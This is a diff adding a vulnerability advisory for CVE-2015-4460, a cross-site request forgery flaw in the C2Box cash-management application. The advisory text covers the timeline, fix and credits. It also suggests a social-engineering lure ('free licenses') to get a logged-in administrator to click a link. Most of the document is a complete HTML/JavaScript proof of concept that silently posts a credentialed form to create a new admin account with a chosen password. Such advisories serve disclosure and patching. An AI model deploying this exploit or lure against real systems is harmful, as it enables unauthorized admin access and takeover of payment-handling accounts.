@@ -1,0 +1,305 @@
+Title: Cross-Site Request Forgery (CSRF) Vulnerability in C2Box application  Allows adding an Admin User or reset any user's password.
+Author: Wissam Bashour - Help AG Middle East
+Vendor: boxautomation(B.A.S)
+Product: C2Box 
+Version: All versions below 4.0.0(r19171)
+Tested Version: Version 4.0.0(r19171) 
+Severity: HIGH
+CVE Reference: CVE-2015-4460
+
+# About the Product:
+B.A.S C2Box provides global solutions enabling full control and visibility over cash positions and managing domestic or cross border payment processes.
+
+# Description: 
+This Cross-Site Request Forgery vulnerability enables an anonymous attacker to add an admin account into the application. This leads to compromising the whole domain as the application normally uses privileged domain account to perform administration tasks.
+Also the attacker can reset any user's password after gaining the privileged account.
+
+# Vulnerability Class: 
+Cross-Site Request Forgery (CSRF) - https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
+
+# How to Reproduce: (POC):
+Host the attached code in a webserver. Then send the link to the application Admin. The admin should be logged in when he clicks on the link.
+You can entice him to do that by using social engineering techniques.
+Say for example: Log into the application and click the following link to get free licenses
+
+# Disclosure: 
+Discovered: June 10, 2015
+Vendor Notification: June 10, 2015
+Advisory Publication: June 27, 2015
+Public Disclosure: June 27, 2015
+
+# Solution: 
+Upgrade to the latest Build will fix this issue.
+The new version number is 15.6.22
+Release date: June 22, 2015 
+ 
+
+# credits: 
+Wissam Bashour
+Associate Security Analyst
+Help AG Middle East
+
+
+# Proof of Concept Code:
+https://raw.githubusercontent.com/Siros96/CSRF/master/PoC
+https://www.dropbox.com/s/i45wzl6cqavrzm4/PoC_CSRF_password_reset.mp4?dl=0
+
+
+#References:
+[1] help AG middle East http://www.helpag.com/.
+[2] http://www.boxautomation.com/.
+[3] https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)
+[4] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures.
+
+
+
+----- Proof of concept ----
+
+<html>
+  <!-- CSRF PoC - Wissam-->
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://#thesite/SecuritySetting/UserSecurity/UserManagement.aspx", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------284963701632007118234117095");
+        xhr.withCredentials = true;
+        var body = "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"__EVENTTARGET\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"__EVENTARGUMENT\"\r\n" + 
+          "\r\n" + 
+          "Content-Disposition: form-data; name=\"__VIEWSTATEENCRYPTED\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"__EVENTVALIDATION\"\r\n" + 
+          "\r\n" + 
+          "V0dFoNB2gzNOMIMLLx+05dEOodRjxb1IxsKxMr+ehPpXQ0dPvYTi/CNzoqOkFt0ZFBapLnziRwgnyQas/THRwIawzpqTC0Kr4vX9u+YW5L0t1xef4donRvhTIZYESWR1oeFn1Rwtox5X3e20bAUS4A==\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$pnlUser$txtUserName\"\r\n" + 
+          "\r\n" + 
+          "WISSAM\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$pnlUser$txtUserName$CVS\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$pnlUser$txtPassword\"\r\n" + 
+          "\r\n" + 
+          "wissamwissam\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$pnlUser$txtPassword$CVS\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$pnlUser$txtConfirm\"\r\n" + 
+          "\r\n" + 
+          "wissamwissam\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$pnlUser$txtConfirm$CVS\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$pnlUser$txtEmail\"\r\n" + 
+          "\r\n" + 
+          "wissam@blablabla.com\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$pnlUser$txtEmail$CVS\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$pnlUser$btnCreateUser\"\r\n" + 
+          "\r\n" + 
+          "Create User\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ExportControl1_ASPxPopupControl1WS\"\r\n" + 
+          "\r\n" + 
+          "0:0:-1:-10000:-10000:0:35:150:1:0:0:0\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ExportControl1_ppSaveLayoutWS\"\r\n" + 
+          "\r\n" + 
+          "0:0:-1:-10000:-10000:0:400:100:1:0:0:0\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ExportControl1$ppSaveLayout$txtLayoutName\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ExportControl1$ppSaveLayout$txtLayoutName$CVS\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ExportControl1_ppShowLayoutsWS\"\r\n" + 
+          "\r\n" + 
+          "0:0:-1:-10000:-10000:0:280:315:1:0:0:0\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ExportControl1$ppShowLayouts$lbxLayouts\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ExportControl1_EXPASPxCallbackPanel1_ASPxPopupControl2WS\"\r\n" + 
+          "\r\n" + 
+          "0:0:-1:-10000:-10000:0:600:450:1:0:0:0\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ExportControl1_EXPASPxCallbackPanel1_ASPxPopupControl2_fileManExp_State\"\r\n" + 
+          "\r\n" + 
+          "{\"file\":{},\"currentPath\":\"\"}\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ExportControl1_EXPASPxCallbackPanel1_ASPxPopupControl2_fileManExp_Splitter_CS\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ExportControl1$EXPASPxCallbackPanel1$ASPxPopupControl2$fileManExp$Splitter$FilesGridView$DXSelInput\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ExportControl1$EXPASPxCallbackPanel1$ASPxPopupControl2$fileManExp$Splitter$FilesGridView$DXKVInput\"\r\n" + 
+          "\r\n" + 
+          "[]\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ExportControl1$EXPASPxCallbackPanel1$ASPxPopupControl2$fileManExp$Splitter$FilesGridView$CallbackState\"\r\n" + 
+          "\r\n" + 
+          "BwEHAQIFU3RhdGUHQgcEBwACAQcBAgEHAgIBBwMCAQcABwAHAAcAAgAG//8JAgROYW1lBwAJAgACAAMHBAIABwACAQcABwACAQcABwAHAA==\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ExportControl1$EXPASPxCallbackPanel1$ASPxPopupControl2$fileManExp$Splitter$FilesGridView$DXFocusedRowInput\"\r\n" + 
+          "\r\n" + 
+          "-1\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ExportControl1$EXPASPxCallbackPanel1$ASPxPopupControl2$fileManExp$Splitter$FilesGridView$DXSyncInput\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ExportControl1_EXPASPxCallbackPanel1_ASPxPopupControl2_fileManExp_Splitter_Upload_IC\"\r\n" + 
+          "\r\n" + 
+          "1\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ExportControl1_EXPASPxCallbackPanel1_ASPxPopupControl2_fileManExp_Splitter_Upload_TextBoxT_Input\"; filename=\"\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ExportControl1_EXPASPxCallbackPanel1_ASPxPopupControl2_fileManExp_Splitter_Upload_TextBox0_Input\"; filename=\"\"\r\n" + 
+          "Content-Type: application/octet-stream\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ASPxGridView1$DXFREditorcol3\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ASPxGridView1_DXFREditorcol8_VI\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ASPxGridView1$DXFREditorcol8\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ASPxGridView1_DXFREditorcol8_DDDWS\"\r\n" + 
+          "\r\n" + 
+          "0:0:-1:-10000:-10000:0:0:0:1:0:0:0\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ASPxGridView1_DXFREditorcol8_DDD_LDeletedItems\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ASPxGridView1_DXFREditorcol8_DDD_LInsertedItems\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ASPxGridView1_DXFREditorcol8_DDD_LCustomCallback\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ASPxGridView1$DXFREditorcol8$DDD$L\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ASPxGridView1_DXFREditorcol13_VI\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ASPxGridView1$DXFREditorcol13\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ASPxGridView1_DXFREditorcol13_DDDWS\"\r\n" + 
+          "\r\n" + 
+          "0:0:-1:-10000:-10000:0:0:0:1:0:0:0\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ASPxGridView1_DXFREditorcol13_DDD_LDeletedItems\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ASPxGridView1_DXFREditorcol13_DDD_LInsertedItems\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ASPxGridView1_DXFREditorcol13_DDD_LCustomCallback\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ASPxGridView1$DXFREditorcol13$DDD$L\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ASPxGridView1$DXFREditorcol12\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ASPxGridView1$DXFREditorcol11\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ASPxGridView1$DXFREditorcol10\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ASPxGridView1$DXFREditorcol9\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00_ContentPlaceHolder1_ASPxRoundPanel1_ASPxGridView1_custwindowWS\"\r\n" + 
+          "\r\n" + 
+          "0:0:-1:-10000:-10000:0:1:0:1:0:0:0\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ASPxGridView1$DXSelInput\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ASPxGridView1$DXKVInput\"\r\n" + 
+          "\r\n" + 
+          "[\'29bda11f-d51d-4c78-b7fc-0056d4b826ff\',\'c32608dc-946e-40ec-9be9-9f4e500539e6\',\'ca1a4bd3-9ba0-43a6-980e-60a8177be663\',\'8ccfc87f-e649-4a7b-bd16-a85ea172e54e\',\'e26a0c3b-eae0-4f76-8b88-185df3df8522\',\'0bc5697a-de09-4046-81b8-6f5fdda3f8e9\',\'cd21124b-9aec-472a-96e4-5ebefaa32fb1\',\'565dd57d-0420-4666-a443-7830349e2c66\',\'5aedba74-01b3-4d06-8159-19f3b30e6948\']\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$ASPxRoundPanel1$ASPxGridView1$CallbackState\"\r\n" + 
+          "\r\n" + 
+          "BwQHAQIFU3RhdGUHdwcOBwACAQcAAgAHAAIABwECAQcBAgAHAQIABwECAAcBAgAHAgIBBwgCAQcHAgEHBgIBBwUCAQcEAgEHAAcABwAHAAIABQAAAIAJAgZVc2VySWQHAQIGVXNlcklkCwkCAAIAAwcEAgAHAAIBBzEHAAIBBwAHAAcAAg1TaG93RmlsdGVyUm93CgIBAhBGaWx0ZXJFeHByZXNzaW9uBwIAAglQYWdlSW5kZXgDBwQ=\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"DXScript\"\r\n" + 
+          "\r\n" + 
+          "1_171,1_94,1_164,1_114,1_121,1_105,1_91,1_156,1_154,1_116,1_93,1_169,1_138,1_170,1_124,1_163,1_162,1_147,1_104,1_166,1_139,1_120,1_98,1_125,1_157,1_108,1_113,1_106,1_152\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"DXCss\"\r\n" + 
+          "\r\n" + 
+          "0_2117,1_12,0_2121,1_5,0_2015,0_2013,0_2017,0_2019,../../Styles/css/alertify.css,../../Styles/css/themes/default.css,../../Styles/css/bootstrap-theme.css,../../Styles/css/bootstrap.css,../../Styles/css/LobbySiteMapStyle.css,../../Styles/IconFonts/flaticon.css,../../Styles/css/FormStyle.css,../../Styles/css/PopupStyle.css,../../Images/apple-icon-57x57.png,../../Images/apple-icon-60x60.png,../../Images/apple-icon-72x72.png,../../Images/apple-icon-76x76.png,../../Images/apple-icon-114x114.png,../../Images/apple-icon-120x120.png,../../Images/apple-icon-144x144.png,../../Images/apple-icon-152x152.png,../../Images/apple-icon-180x180.png,../../Images/android-icon-192x192.png,../../Images/favicon-32x32.png,../../Images/favicon-96x96.png,../../Images/favicon-16x16.png,../../Images/manifest.json\r\n" + 
+          "-----------------------------284963701632007118234117095\r\n" + 
+          "Content-Disposition: form-data; name=\"ctl00$ContentPlaceHolder1$pnlUser$btnCreateUser\"\r\n" + 
+          "\r\n" + 
+          "\r\n" + 
+          "-----------------------------284963701632007118234117095--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="PUSH THE BUTTON" onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
